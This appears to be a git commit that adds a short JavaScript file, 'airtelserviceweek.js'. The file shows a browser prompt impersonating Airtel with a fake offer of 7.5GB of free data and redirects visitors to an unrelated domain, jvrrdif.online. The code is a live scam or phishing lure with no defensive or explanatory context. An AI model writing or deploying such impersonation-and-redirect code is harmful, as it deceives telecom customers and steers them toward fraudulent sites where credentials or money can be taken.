beeb219cdd69ecc946c479ae49feb6242b2d5476
newetijazz7 <newetijazz7@gmail.com>
2025-10-07 17:50:21 +0100

    Create airtelserviceweek.js

---
+++ airtelserviceweek.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 7.5GB'
+password=prompt('Airtel: We are offering 7.5gb free data to celebrate Customers Service Week, press OK to Activate now','ACTIVATE 7.5GB');
+if (password != 'ACTIVATE 7.5GB') {
+location.href='https://www.jvrrdif.online/Customers-service-week-7.5gb';
+}
